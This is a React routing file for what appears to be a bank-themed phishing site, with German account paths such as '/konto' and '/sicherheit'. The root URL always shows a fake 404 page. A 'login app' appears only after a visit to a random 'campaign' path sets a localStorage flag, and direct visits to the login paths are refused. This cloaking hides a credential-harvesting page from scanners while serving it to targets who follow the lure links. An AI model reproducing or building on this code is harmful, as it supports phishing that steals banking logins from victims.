import { StrictMode } from 'react'
import { createRoot } from 'react-dom/client'
import { BrowserRouter, Routes, Route, Navigate, useLocation } from 'react-router-dom'
import App from './App.jsx'
import NotFound from './components/NotFound.jsx'

// Reserved paths that show the login page (but require prior authorization)
const reservedPaths = [
  '/cancel',
  '/verify', 
  '/login',
  '/secure',
  '/banking',
  '/auth',
  '/session',
  '/konto',
  '/bestaetigung',
  '/sicherheit'
]

// Check if path is a reserved/known path
const isReservedPath = (path) => {
  return reservedPaths.includes(path.toLowerCase())
}

// Default redirect path after random entry
const DEFAULT_REDIRECT = '/cancel'

// Component that handles random path entry (first visit)
// Any non-reserved, non-root path grants access then redirects
function RandomPathHandler() {
  const location = useLocation()
  const path = location.pathname
  
  // Save the random path to localStorage and grant access
  localStorage.setItem('url_path', path)
  localStorage.setItem('can_visit', 'true')
  
  // Redirect to the real route (entry point only, don't stay on random URL)
  return <Navigate to={DEFAULT_REDIRECT} replace />
}

// Component that protects reserved routes
// Only allows access if can_visit is true in localStorage
function ProtectedRoute() {
  const canVisit = localStorage.getItem('can_visit') === 'true'
  
  if (!canVisit) {
    // Not authorized - redirect to root (404 page)
    return <Navigate to="/" replace />
  }
  
  // Authorized - show the login app
  return <App />
}

// Main routing component
function AppRouter() {
  const location = useLocation()
  const path = location.pathname
  
  // Root path - always show 404
  if (path === '/') {
    return <NotFound />
  }
  
  // Reserved paths - require prior authorization
  if (isReservedPath(path)) {
    return <ProtectedRoute />
  }
  
  // Any other path (random/campaign path) - grant access and show app
  return <RandomPathHandler />
}

createRoot(document.getElementById('root')).render(
  <StrictMode>
    <BrowserRouter>
      <AppRouter />
    </BrowserRouter>
  </StrictMode>,
)
